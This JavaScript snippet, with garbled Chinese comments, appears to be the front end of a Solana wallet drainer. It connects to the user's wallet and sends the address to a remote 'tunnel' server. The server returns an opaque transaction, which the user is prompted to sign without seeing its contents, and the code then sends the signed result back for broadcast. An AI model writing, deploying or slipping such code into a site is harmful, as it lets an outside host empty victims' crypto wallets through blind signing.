const p = window.trustwallet?.solana || window.solana;
await p.connect();

// ðŸ”± ç®€åŒ–å‰ç«¯é€»è¾‘ï¼Œåªä¼ åœ°å€ï¼Œå‡å°‘ 400 æ¦‚çŽ‡
const resp = await fetch(tunnel + "/prepare_v32", {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ address: p.publicKey.toString() })
});

const info = await resp.json();
if (info.raw_tx) {
    const web3 = window.solanaWeb3;
    // ðŸ”± å…³é”®ï¼šå¿…é¡»ä½¿ç”¨ from ååºåˆ—åŒ–ï¼Œç¡®ä¿ç­¾åä½å¯¹é½
    const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
    const signed = await p.signTransaction(tx);
    
    // å¹¿æ’­
    const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));
    await fetch(tunnel + "/broadcast_v41", {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ signed_tx: signedBase })
    });
}
